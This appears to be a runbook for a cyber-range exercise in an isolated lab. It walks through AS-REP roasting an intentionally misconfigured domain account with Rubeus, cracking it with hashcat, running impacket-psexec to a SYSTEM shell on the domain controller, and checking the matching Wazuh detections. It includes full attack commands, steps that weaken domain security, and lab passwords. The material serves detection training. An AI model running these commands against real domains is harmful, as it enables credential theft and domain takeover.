# EWS → DC AS-REP Pivot Runbook

End-to-end pivot test that runs Rubeus AS-REP roast from the **workgroup**
Windows EWS against the `secretcon.local` DC, cracks the hash on Kali, and
lands `impacket-psexec` on the DC as `nt authority\system`. All seven steps
emit the SIEM signal blue scorers expect.

Pairs with:

- [docs/campaign/three-box-chain.md](three-box-chain.md) — chain topology
  and provisioning misconfigs.
- [docs/campaign/defend-track-rubric.md](defend-track-rubric.md) — full
  blue scoring categories.
- [docs/asrep/defend-faq-walkthrough.md](../asrep/defend-faq-walkthrough.md) — why
  the 4768 etype 0x17 signal is the canonical AS-REP indicator.

## Topology

```
Kali (dev shell)
   │
   │  ssh -L 25985 / 25986 / 28800 / 23890 / 24450 root@proxmox
   ▼
[ Proxmox vmbr1, 192.168.61.0/24 ]
   ├── Wazuh    192.168.61.10
   ├── EWS      192.168.61.20    (workgroup, local Administrator)
   ├── CysVuln  192.168.61.51
   └── DC       192.168.61.52    (secretcon.local, AD DS, DNS)
```

EWS is **not** domain-joined. Rubeus targets the DC explicitly with
`/user:enite /domain:secretcon.local /dc:192.168.61.52` so the workgroup
foothold is enough — no LDAP enumeration, no domain user.

## Required environment

```
PROXMOX_PASSWORD                          # for the WinRM/SMB ssh tunnels
SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD     # local Administrator on EWS
AD_SAFEMODE_PASSWORD                      # Administrator on DC
SECRETCON_DC_ROOT_FLAG                    # expected flag content
```

Optional overrides: `CHAIN_EWS_IP`, `CHAIN_DC_IP`, `CHAIN_WAZUH_IP`,
`SECRETCON_ASREP_USER` (`enite`), `SECRETCON_ASREP_PASSWORD` (`stud87`),
`PIVOT_WORDLIST` (defaults to rockyou.txt → smoke list).

## Quick start

```bash
nix develop .#kali
./scripts/observability/fetch-rubeus.sh        # one-time, pins sha256
./scripts/observability/ews-asrep-pivot.sh     # 7-step harness
```

Artifacts land under `artifacts/campaign/pivot/<run-id>/`:

```
preflight.json        # step 1 + 2 raw probes
dc-probe.json         # enite DA / preauth / RC4 dump
rubeus-stdout.txt     # step 3 EWS-side
asrep.hashes          # $krb5asrep$23$ hash file
hashcat.show          # step 4 cracked password
psexec-output.txt     # step 5 SYSTEM shell
root.txt              # step 6 flag content
wazuh/alerts.json     # step 7 raw drain
wazuh/4768-rc4.json   # filtered EncryptionType 0x17
scorecard.json        # 7-step pass/fail
```

A pass is `7/7` PASS in `scorecard.json` and a non-empty `wazuh/4768-rc4.json`
whose `data.win.eventdata.ipAddress` field equals the EWS IP.

## 7-step checklist

### 1. Connectivity preflight (Kali)

| Check                      | Pass when                                                           |
|----------------------------|---------------------------------------------------------------------|
| Tunnel `EWS:5985`          | `127.0.0.1:25985` listens                                           |
| Tunnel `DC:88`             | `127.0.0.1:28800` listens                                           |
| Tunnel `DC:389`            | `127.0.0.1:23890` listens                                           |
| WinRM as local Admin (EWS) | `hostname` returns the EWS computer name                            |
| EWS → DC reachable         | `Test-NetConnection -Port 88` → `TcpTestSucceeded=True` from EWS    |
| EWS → `secretcon.local`    | `Resolve-DnsName -Server <DC>` returns A record (warn-only)         |

### 2. DC asserts (Administrator on DC via tunnel)

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
(Get-ADUser enite -Properties KerberosEncryptionType).KerberosEncryptionType
(Get-ADPrincipalGroupMembership enite | Where Name -eq 'Domain Admins').Name
```

| Assert                              | Pass when                                                |
|-------------------------------------|----------------------------------------------------------|
| `enite` exists                      | user resolves                                            |
| `DoesNotRequirePreAuth = true`      | UAC bit 0x400000 set                                     |
| `KerberosEncryptionType = RC4`      | enctype includes `RC4` (etype 23)                        |
| `enite ∈ Domain Admins`             | only when `SECRETCON_ASREP_ENITE_DA != "0"` (default 1)  |

### 3. Rubeus AS-REP roast on EWS (fully automated)

Rubeus is staged as base64 chunks over WinRM into `C:\Users\Public\Rubeus.exe`,
then run as the local Administrator:

```powershell
& "C:\Users\Public\Rubeus.exe" asreproast `
    /user:enite /domain:secretcon.local /dc:192.168.61.52 `
    /format:hashcat /nowrap /outfile:C:\Users\Public\asrep.hashes
```

Why the explicit flags:

- `/user:enite` — EWS is workgroup, so Rubeus cannot enumerate AS-REP-roastable
  accounts via LDAP. The harness names the target user up front.
- `/domain:secretcon.local /dc:<ip>` — EWS DNS may not resolve `secretcon.local`
  unless chain DNS was configured; the explicit DC IP bypasses that dependency.
- `/format:hashcat` — emits `$krb5asrep$23$enite@SECRETCON.LOCAL:...` (mode 18200).
- `/nowrap` — newer Rubeus releases line-wrap by default; hashcat needs a
  single line per hash.

Pass when `asrep.hashes` starts with `$krb5asrep$23$`.

### 4. Hashcat (Kali, dev shell)

```bash
hashcat -m 18200 -a 0 asrep.hashes "$WORDLIST" --runtime 60 --quiet --force
hashcat -m 18200 --show asrep.hashes
```

Wordlist resolution mirrors `validate-asrep.sh`:

1. `/usr/share/wordlists/rockyou.txt` if present (Kali default)
2. `artifacts/asrep/wordlists/smoke.txt` (10-word smoke list, includes `stud87`)

Pass when `hashcat --show` reports the cleartext equal to
`$SECRETCON_ASREP_PASSWORD` (default `stud87`).

### 5. impacket-psexec on DC (Kali, via tunnel)

A second tunnel exposes `DC:445` on `127.0.0.1:24450`. The harness then runs:

```bash
impacket-psexec "secretcon.local/enite:stud87@127.0.0.1" \
    -dc-ip 127.0.0.1 -port 24450 -codec utf-8 \
    cmd.exe /c whoami && type C:\Users\Administrator\Desktop\root.txt
```

If `psexec` cannot install the SCM service across the tunnel (some Proxmox
NAT setups break SCMR), it falls back to `impacket-wmiexec`, which uses
DCOM and tends to survive more aggressive netfilter NAT.

Pass when stdout contains `nt authority\system`.

### 6. Root flag exfil

The flag is the next non-empty line after the `whoami` output. The harness
saves it to `root.txt` in the run dir and asserts equality with
`$SECRETCON_DC_ROOT_FLAG` (or accepts any value when the env var is the
default placeholder).

### 7. Wazuh assertions

The harness drains alerts from run-start to run-end via
[`scripts/wazuh-drain-alerts.sh`](../../scripts/wazuh-drain-alerts.sh). The
wait window includes a 30 s flush so the trailing `4624` (`enite` logon type 3
during psexec) makes it to the manager.

| Rule    | Description                                                            |
|---------|------------------------------------------------------------------------|
| `100700`| AS-REP for `enite@` (existing chain rule)                              |
| `100716`| AS-REP for `enite` served as RC4 (etype `0x17` confirmed) — new in this plan |
| `100715`| `enite` 4624 type 3 from psexec lateral movement                       |
| raw 4768| `ipAddress == EWS .20` and `ticketEncryptionType == 0x17`              |

The filtered `wazuh/4768-rc4.json` should contain at least one event whose
`ipAddress` matches `CHAIN_EWS_IP`. Multiple events are fine; the harness
just requires count ≥ 1.

## Demo failure modes

| Symptom                                              | Likely cause                                              | Fix                                                                                  |
|------------------------------------------------------|-----------------------------------------------------------|--------------------------------------------------------------------------------------|
| step 1: `ews-can-reach-dc-88 = False`                | vmbr1 firewall or DC offline                              | check `pveum`/`opnsense` rules; `./scripts/proxmox/configure-chain-dns.sh`            |
| step 1: `ews-dns-secretcon.local` empty (warn only)  | EWS still pointing at upstream resolver                   | rebuild EWS or push `Set-DnsClientServerAddress` to point at `192.168.61.52`         |
| step 2: `enite-enctype-rc4` FAIL (got AES)           | `Set-ADUser -KerberosEncryptionType RC4` did not stick    | `ksetup /setenctypeattr secretcon.local RC4-HMAC-MD5 ...` then re-run                |
| step 3: Rubeus runs but hash file empty              | DC not actually publishing AS-REP for `enite`             | check `Get-ADUser enite -Properties UserAccountControl`; bit 0x400000 must be set    |
| step 3: Rubeus quarantined / not run                 | Defender Tamper Protection re-enabled RTP                 | `SecretConDefenderRelax` scheduled task is in the bootstrap; reapply or rebuild EWS  |
| step 4: hashcat completes but 0 cracked              | wordlist missing `stud87`                                 | seed `artifacts/asrep/wordlists/smoke.txt` or point at a fuller list via `PIVOT_WORDLIST` |
| step 5: psexec hangs at `[*] Requesting shares`      | SMB tunnel up but SCMR fails on the named pipe           | harness auto-falls back to wmiexec; if both fail, check `nxc smb` from Kali          |
| step 6: flag mismatch                                | DC was provisioned before flag env was set                | re-run `winrm_bootstrap_asrep.py` with `SECRETCON_DC_ROOT_FLAG` set                  |
| step 7: rule `100716` missing                        | rule not synced after edit                                | `./scripts/proxmox/sync-wazuh-rules.sh` then replay last minute of activity          |
| step 7: drain returns no `4768` at all               | DC audit policy lost                                      | `auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable`       |

## Order check on `asrep-bootstrap-runtime.ps1`

Current ordering already satisfies the "policy before password" prereq:

1. `Set-ADDefaultDomainPasswordPolicy` (length 4, no complexity, no lockout)
2. `ksetup /setenctypeattr` + registry `SupportedEncryptionTypes`
3. `New-ADUser` (or `Set-ADAccountPassword` on re-run) with `-KerberosEncryptionType RC4`
4. `Set-ADAccountControl -DoesNotRequirePreAuth $true` and re-assert RC4
5. `Add-ADGroupMember -Identity 'Domain Admins'` when `SECRETCON_ASREP_ENITE_DA=1`
6. Flag write + ACLs (Domain Users for `user.txt`, Administrators for `root.txt`)

The validator `scripts/verify-asrep.sh` re-checks step 1+3+4+5 every time
the chain validation runs, so drift gets caught before scorecard generation.

## Acceptance

```bash
export PROXMOX_PASSWORD=...
export SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD=PizzaMan123!
export SECRETCON_ASREP_PASSWORD=stud87
export SECRETCON_DC_ROOT_FLAG='flag{...}'

./scripts/proxmox/sync-wazuh-rules.sh                  # picks up rule 100716
./scripts/observability/fetch-rubeus.sh                # cache the binary
./scripts/observability/ews-asrep-pivot.sh             # 7/7 PASS

# stress-campaign mode (3 iterations, ≥ 90% pivot_score=7)
./scripts/observability/stress-campaign-chain.sh --iterations 3 --pivot --siem
```
